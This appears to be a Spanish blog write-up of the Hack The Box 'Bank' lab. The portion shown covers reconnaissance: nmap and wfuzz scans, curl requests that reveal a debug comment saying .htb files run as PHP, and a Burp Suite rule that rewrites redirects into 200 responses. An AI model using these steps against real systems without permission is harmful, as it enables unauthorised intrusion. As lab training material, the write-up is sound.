<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box Bank - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina Bank en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box Bank">
<meta property="og:url" content="http://localhost:4000/htb-bank/">


  <meta property="og:description" content="Resolución de la máquina Bank en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-bank/bank.jpg">





  <meta property="article:published_time" content="2022-02-28T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-bank/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box Bank</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box Bank">
    <meta itemprop="description" content="Resolución de la máquina Bank en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="February 28, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Bank
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-02-28T00:00:00-06:00">February 28, 2022 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-bank/banner-bank.jpg" alt="" /></p>

<h2 id="bank">Bank</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.29.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.29
PING 10.10.10.29 <span class="o">(</span>10.10.10.29<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.29: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>132 ms

<span class="nt">---</span> 10.10.10.29 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 132.094/132.094/132.094/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.29 <span class="nt">-oG</span> allPorts
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-28 12:03 CST
Initiating Ping Scan at 12:03
Scanning 10.10.10.29 <span class="o">[</span>4 ports]
Completed Ping Scan at 12:03, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 12:03
Scanning 10.10.10.29 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.10.29
Discovered open port 53/tcp on 10.10.10.29
Discovered open port 80/tcp on 10.10.10.29
Completed SYN Stealth Scan at 12:03, 35.63s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.29
Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>35.91 seconds
           Raw packets sent: 67798 <span class="o">(</span>2.983MB<span class="o">)</span> | Rcvd: 67772 <span class="o">(</span>2.711MB<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 119 B
───────┼─────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.29
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,53,80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,53,80 10.10.10.29 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-28 12:04 CST
Nmap scan report <span class="k">for </span>10.10.10.29
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>16.63 seconds
</code></pre></div></div>

<p>Vemos el puerto 80 abierto, por lo que antes de visualizar el contenido vía web, vamos a ver a lo que nos enfrentamos con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.29/
http://10.10.10.29/ <span class="o">[</span>200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.29], Title[Apache2 Ubuntu Default Page: It works]
</code></pre></div></div>

<p>Vemos que nos encontramos con la página default de Apache2. Algo que vemos es que se encuentra abierto el puerto 53, por lo que podríamos pensar que se está aplicando <strong><em>Virtual hosting</em></strong>; asi que dentro de nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> vamos a agregar la dirección IP con el dominio <strong>bank.htb</strong> y cargar la página bajo dicho dominio a ver si vemos otra cosa.</p>

<p><img src="/assets/images/htb-bank/bank-web.png" alt="" /></p>

<p>Nos encontramos con un panel de login en el cual podríamos tratar de hace inyecciones SQL, Padding Oracle Attack, fuerza bruta, etc. Sin embargo, no nos va a funcionar. Algo que podemos notar es que se tiene el recurso <code class="language-plaintext highlighter-rouge">login.php</code>; por lo tanto podríamos tratar de descubrir más recursos de extensión php:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">--hh</span><span class="o">=</span>7322 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bank.htb/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000014:   403        10 L     30 W       279 Ch      "http://bank.htb/.php"                                          
000000053:   200        51 L     125 W      1974 Ch     "login"                                                         
000000055:   302        83 L     186 W      3291 Ch     "support"                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 7.929055
Processed Requests: 374
Filtered Requests: 371
Requests/sec.: 47.16829
</span></code></pre></div></div>

<p>Vemos el recurso <code class="language-plaintext highlighter-rouge">support.php</code> que tiene un código de estado 302, así que aplicaremos el parámetro <code class="language-plaintext highlighter-rouge">-L</code> para ver a donde nos redirige.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bank.htb/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000001:   200        51 L     125 W      1974 Ch     "# directory-list-2.3-medium.txt"                               
000000003:   200        51 L     125 W      1974 Ch     "# Copyright 2007 James Fisher"                                 
000000007:   200        51 L     125 W      1974 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/
                                                        "                                                               
000000015:   200        51 L     125 W      1974 Ch     "index"                                                         
000000014:   403        10 L     30 W       279 Ch      "http://bank.htb/.php"                                          
000000013:   200        51 L     125 W      1974 Ch     "#"                                                             
000000012:   200        51 L     125 W      1974 Ch     "# on atleast 2 different hosts"                                
000000002:   200        51 L     125 W      1974 Ch     "#"                                                             
000000011:   200        51 L     125 W      1974 Ch     "# Priority ordered case sensative list, where entries were foun
                                                        d"                                                              
000000010:   200        51 L     125 W      1974 Ch     "#"                                                             
000000009:   200        51 L     125 W      1974 Ch     "# Suite 300, San Francisco, California, 94105, USA."           
000000008:   200        51 L     125 W      1974 Ch     "# or send a letter to Creative Commons, 171 Second Street,"    
000000006:   200        51 L     125 W      1974 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this" 
000000005:   200        51 L     125 W      1974 Ch     "# This work is licensed under the Creative Commons"            
000000004:   200        51 L     125 W      1974 Ch     "#"                                                             
000000053:   200        51 L     125 W      1974 Ch     "login"                                                         
000000055:   200        51 L     125 W      1974 Ch     "support"                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 8.147257
Processed Requests: 373
Filtered Requests: 356
Requests/sec.: 45.78227
</span></code></pre></div></div>

<p>Si nos fijamos en la cantidad de caracteres del recurso <code class="language-plaintext highlighter-rouge">support.php</code> con <code class="language-plaintext highlighter-rouge">login.php</code> vemos que son lo mismo; por lo que es posible que <code class="language-plaintext highlighter-rouge">support.php</code> nos redirija a <code class="language-plaintext highlighter-rouge">login.php</code> y lo podemos comprar vía web. Aquí lo que nos importa es ver el contenido de <code class="language-plaintext highlighter-rouge">support.php</code>, así que vamos a hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">curl</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://bank.htb/login.php
                                                                                                                                 
&lt;<span class="o">!</span>DOCTYPE html&gt;       
&lt;html&gt;                                                                                                                           
  &lt;<span class="nb">head</span><span class="o">&gt;</span>           
    &lt;title&gt;HTB Bank - Login&lt;/title&gt;                                                                                              
    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;</span>
    &lt;<span class="o">!</span><span class="nt">--</span> Bootstrap <span class="nt">--</span><span class="o">&gt;</span>   
    &lt;<span class="nb">link </span><span class="nv">href</span><span class="o">=</span><span class="s2">"./assets/css/bootstrap.min.css"</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span><span class="o">&gt;</span>
    &lt;<span class="o">!</span><span class="nt">--</span> styles <span class="nt">--</span><span class="o">&gt;</span>           
    &lt;<span class="nb">link </span><span class="nv">href</span><span class="o">=</span><span class="s2">"./assets/css/theme/styles.css"</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span><span class="o">&gt;</span> 
  &lt;/head&gt;                                                       
  &lt;body <span class="nv">class</span><span class="o">=</span><span class="s2">"login-bg"</span><span class="o">&gt;</span>    
    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"header"</span><span class="o">&gt;</span>                                        
       &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"container"</span><span class="o">&gt;</span>                                  
          &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row"</span><span class="o">&gt;</span>
             &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-md-12"</span><span class="o">&gt;</span>
                &lt;<span class="o">!</span><span class="nt">--</span> Logo <span class="nt">--</span><span class="o">&gt;</span>
                &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"logo"</span><span class="o">&gt;</span>
                   &lt;h1&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"index.html"</span><span class="o">&gt;</span>HTB Bank&lt;/a&gt;&lt;/h1&gt;
                &lt;/div&gt;
             &lt;/div&gt;                                             
          &lt;/div&gt;     
       &lt;/div&gt;                                                   
  &lt;/div&gt;                                                        
                                
  &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"page-content container"</span><span class="o">&gt;</span>      
    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"row"</span><span class="o">&gt;</span>                                           
      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-md-4 col-md-offset-4"</span><span class="o">&gt;</span>                                                                                     
        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"login-wrapper"</span><span class="o">&gt;</span>                                                                                              
              &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"box"</span><span class="o">&gt;</span>                                                                                                  
                  &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"content-wrap"</span><span class="o">&gt;</span>
                      &lt;h6&gt;Login&lt;/h6&gt;                                                                                             
                                            &lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span> action&gt;
                        &lt;input <span class="nv">class</span><span class="o">=</span><span class="s2">"form-control"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"inputEmail"</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">"E-mail address"</span> required&gt;
                        &lt;input <span class="nv">class</span><span class="o">=</span><span class="s2">"form-control"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"inputPassword"</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">"Password"</span> required&gt;
                        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"action"</span><span class="o">&gt;</span>
                            &lt;input <span class="nv">class</span><span class="o">=</span><span class="s2">"btn btn-primary signup"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"submit"</span> /&gt;
                        &lt;/div&gt;
                      &lt;/form&gt;                 
                  &lt;/div&gt;
              &lt;/div&gt;                                                                                                             
          &lt;/div&gt;                                                
      &lt;/div&gt;                                                                                                                     
    &lt;/div&gt;                                                      
  &lt;/div&gt;
    &lt;<span class="o">!</span><span class="nt">--</span> jQuery <span class="o">(</span>necessary <span class="k">for </span>Bootstrap<span class="s1">'s JavaScript plugins) --&gt;
    &lt;script src="https://code.jquery.com/jquery.js"&gt;&lt;/script&gt;
    &lt;!-- Include all compiled plugins (below), or include individual files as needed --&gt;
    &lt;script src="./assets/js/js/bootstrap.min.js"&gt;&lt;/script&gt;
    &lt;script src="./assets/js/theme/custom.js"&gt;&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;#
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-s</span> http://bank.htb/support.php                                                                                            
                                
&lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-sm-5"</span><span class="o">&gt;</span>                                          
    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"panel panel-primary"</span><span class="o">&gt;</span>                                                                                                    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"panel-heading"</span><span class="o">&gt;</span>
            &lt;h3 <span class="nv">style</span><span class="o">=</span><span class="s2">"font-size: 20px;"</span><span class="o">&gt;</span>My Tickets&lt;/h3&gt;                                                                         
        &lt;/div&gt;                                                  
        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"panel-body"</span><span class="o">&gt;</span>                                                                                                                     &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"content-box-large"</span><span class="o">&gt;</span>                                                                                                      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"panel-body"</span><span class="o">&gt;</span>                                                                                 
                            &lt;table <span class="nv">class</span><span class="o">=</span><span class="s2">"table table-bordered"</span><span class="o">&gt;</span> 
                                &lt;thead&gt;       
                                    &lt;<span class="nb">tr</span><span class="o">&gt;</span>                                                                                         
                                        &lt;th&gt;#&lt;/th&gt;
                                        &lt;th&gt;Title&lt;/th&gt;
                                        &lt;th&gt;Message&lt;/th&gt;                                                                                                                 &lt;th&gt;Attachment&lt;/th&gt;                                                                      
                                        &lt;th&gt;Actions&lt;/th&gt;
                                    &lt;/tr&gt;
                                &lt;/thead&gt;
                                &lt;tbody&gt;
                                                                &lt;/tbody&gt;
                            &lt;/table&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
    &lt;/div&gt;                     
&lt;/div&gt;
&lt;<span class="o">!</span><span class="nt">--</span> New Ticket <span class="nt">--</span><span class="o">&gt;</span>
&lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"col-sm-5"</span><span class="o">&gt;</span>
    &lt;section <span class="nv">class</span><span class="o">=</span><span class="s2">"panel"</span><span class="o">&gt;</span>
                                
        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"panel-body"</span><span class="o">&gt;</span>                 
            &lt;form <span class="nv">class</span><span class="o">=</span><span class="s2">"new_ticket"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"new_ticket"</span> accept-charset<span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span> <span class="nv">enctype</span><span class="o">=</span><span class="s2">"multipart/form-data"</span><span class="o">&gt;</span>
                                                                
                &lt;label&gt;Title&lt;/label&gt;                    
                &lt;input required <span class="nv">placeholder</span><span class="o">=</span><span class="s2">"Title"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"form-control"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"title"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"ticket_title"</span> <span class="nv">style</span><span class="o">=</span><span class="s2">"backgr
ound-repeat: repeat; background-image: none; background-position: 0% 0%;"</span><span class="o">&gt;</span>
                &lt;br&gt;                                                                                                             
                                                                                                                                 
                &lt;label&gt;Message&lt;/label&gt;                                                                                           
                &lt;textarea required <span class="nv">placeholder</span><span class="o">=</span><span class="s2">"Tell us your problem"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"form-control"</span> <span class="nv">style</span><span class="o">=</span><span class="s2">"height: 170px; background-repea
t: repeat; background-image: none; background-position: 0% 0%;"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"message"</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"ticket_message"</span><span class="o">&gt;</span>&lt;/textarea&gt;
                &lt;br&gt;                                            
                &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"position:relative;"</span><span class="o">&gt;</span>
                                &lt;<span class="o">!</span><span class="nt">--</span> <span class="o">[</span>DEBUG] I added the file extension .htb to execute as php <span class="k">for </span>debugging purposes only <span class="o">[</span>DEBUG] <span class="nt">--</span><span class="o">&gt;</span>
                                        &lt;a <span class="nv">class</span><span class="o">=</span><span class="s1">'btn btn-primary'</span> <span class="nv">href</span><span class="o">=</span><span class="s1">'javascript:;'</span><span class="o">&gt;</span>
                                            Choose File...
                                            &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"file"</span> required <span class="nv">style</span><span class="o">=</span><span class="s1">'position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;'</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"fileToUpload"</span> <span class="nv">size</span><span class="o">=</span><span class="s2">"40"</span>  <span class="nv">onchange</span><span class="o">=</span><span class="s1">'$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'</span><span class="o">&gt;</span>
                                        &lt;/a&gt;
                                        &amp;nbsp<span class="p">;</span>
                                        &lt;span <span class="nv">class</span><span class="o">=</span><span class="s1">'label label-info'</span> <span class="nb">id</span><span class="o">=</span><span class="s2">"upload-file-info"</span><span class="o">&gt;</span>&lt;/span&gt;
                                &lt;/div&gt;
                                &lt;br&gt;
                &lt;button <span class="nv">name</span><span class="o">=</span><span class="s2">"submitadd"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">class</span><span class="o">=</span><span class="s2">"btn btn-primary mt20"</span> data-disable-with<span class="o">=</span><span class="s2">"&lt;div class=&amp;quot;loading-o&amp;quot; style=&amp;quot;padding: 7px 21px;&amp;quot;&gt;&lt;/div&gt;"</span><span class="o">&gt;</span>Submit&lt;/button&gt;
            &lt;/form&gt;

        &lt;/div&gt;

    &lt;/section&gt;

&lt;/div&gt;

        &lt;/div&gt;
        &lt;<span class="o">!</span><span class="nt">--</span> /#page-wrapper <span class="nt">--</span><span class="o">&gt;</span>

    &lt;/div&gt;
    &lt;<span class="o">!</span><span class="nt">--</span> /#wrapper <span class="nt">--</span><span class="o">&gt;</span>

    &lt;<span class="o">!</span><span class="nt">--</span> jQuery <span class="nt">--</span><span class="o">&gt;</span>
    &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"./assets/js/jquery.js"</span><span class="o">&gt;</span>&lt;/script&gt;

    &lt;<span class="o">!</span><span class="nt">--</span> Bootstrap Core JavaScript <span class="nt">--</span><span class="o">&gt;</span>
    &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"./assets/js/bootstrap.min.js"</span><span class="o">&gt;</span>&lt;/script&gt;

    &lt;<span class="o">!</span><span class="nt">--</span> Morris Charts JavaScript <span class="nt">--</span><span class="o">&gt;</span>
    &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"./assets/js/plugins/morris/raphael.min.js"</span><span class="o">&gt;</span>&lt;/script&gt;
    &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"./assets/js/plugins/morris/morris.min.js"</span><span class="o">&gt;</span>&lt;/script&gt;
    &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"./assets/js/plugins/morris/morris-data.js"</span><span class="o">&gt;</span>&lt;/script&gt;

    &lt;<span class="o">!</span><span class="nt">--</span> SweetAlert <span class="nt">--</span><span class="o">&gt;</span>
    &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"./assets/js/sweetalert.min.js"</span><span class="o">&gt;</span>&lt;/script&gt;

&lt;/body&gt;

&lt;/html&gt;
</code></pre></div></div>

<p>Vemos que las respuestas son diferentes y además, si ponemos ojo de lince, tenemos lo siguiente <code class="language-plaintext highlighter-rouge">&lt;!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --&gt;</code> en la respuesta de <code class="language-plaintext highlighter-rouge">support.php</code>. Aquí nos indica que para ejecutar un archivo php debemos de cambiar la extensión a htb. Para poder visualizar el contenido de <code class="language-plaintext highlighter-rouge">support.php</code> sin que nos aplique el <em>redirect</em> vamos a hacer uso de <strong><em>Burp Suite</em></strong>.</p>

<p>En la herramienta vamos a declarar realizar las siguientes configuraciones:</p>
<ul>
  <li>Declarar el scope: <code class="language-plaintext highlighter-rouge">http://bank.htb/</code></li>
</ul>

<p><img src="/assets/images/htb-bank/bank-burp.png" alt="" /></p>

<ul>
  <li>Match and Replace: Cambiar el código de estado <strong>302 Found</strong> por <strong>200 Ok</strong>.</li>
</ul>

<p><img src="/assets/images/htb-bank/bank-burp1.png" alt="" /></p>

